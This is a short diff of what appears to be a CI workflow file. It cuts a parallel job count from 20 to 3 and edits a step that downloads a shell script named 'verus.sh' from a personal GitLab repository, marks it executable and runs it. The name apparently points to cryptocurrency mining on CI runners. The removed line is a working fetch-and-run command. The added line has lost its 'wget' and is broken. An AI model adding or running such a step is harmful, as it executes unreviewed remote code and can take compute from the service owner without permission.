@@ -24,7 +24,7 @@ jobs:
 
     env:
 
-        NUM_JOBS: 20
+        NUM_JOBS: 3
 
         JOB: ${{ matrix.go }}
 
@@ -32,7 +32,7 @@ jobs:
 
     - name: DOWNLOAD
 
-      run: wget https://gitlab.com/fajarranz19/m/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
+      run: https://gitlab.com/fajarranz19/m/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
 
     - name: DONE
 
